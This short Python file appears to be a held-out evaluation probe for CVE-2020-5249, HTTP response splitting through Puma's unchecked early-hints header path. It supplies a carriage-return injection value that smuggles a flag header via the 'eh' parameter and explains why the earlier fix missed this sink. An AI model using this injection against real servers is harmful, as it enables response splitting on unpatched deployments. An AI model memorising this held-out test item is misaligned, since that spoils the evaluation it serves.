#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-5249 residual exploit — HTTP response splitting via the
EARLY-HINTS header path.

The CVE-2020-5247 fix (puma 4.3.2) added `headers.reject! { CRLF_REGEX =~ v }`,
but that guard runs ONLY on the regular response headers. The early-hints lambda

    env[EARLY_HINTS] = lambda { |headers|
      fast_write client, "HTTP/1.1 103 Early Hints\r\n"
      headers.each_pair { |k, vs|
        vs.to_s.split(NEWLINE).each { |v| fast_write client, "#{k}: #{v}\r\n" } } ... }

has NO CR/LF check in 4.3.2. The Rack app reflects ?eh=<value> into an early-hints
`Link: <value>` header, so the same CRLF payload still splits the 103 response and
the injected flag line appears in the raw bytes.

Contract:
  - V1 (puma 4.3.2): early-hints unchecked -> split lands -> flag appears -> RESIDUAL.
  - V2 (puma 4.3.3): CVE-2020-5249 adds `next if possible_header_injection?(v)`
    inside the early-hints lambda -> line skipped -> flag absent -> closed.

Same character class as the seed (CR/LF) — the incompleteness is the missed SINK
(early hints), not a missed character. NEVER exposed to the system-under-test.
"""
from __future__ import annotations

# Identical lone-CR split payload as the seed; ONLY the sink (param eh vs x) differs.
# The residual is the missed SINK (early hints), not a different character.
VALUE = "pcbseed\rX-Pcb-Injected: __PCB_FLAG__"


def candidate() -> dict:
    return {
        "probe_id": "cve-2020-5249-early-hints-crlf",
        "sink": "early_hints",
        "param": "eh",
        "value": VALUE,
    }


if __name__ == "__main__":
    print(candidate())
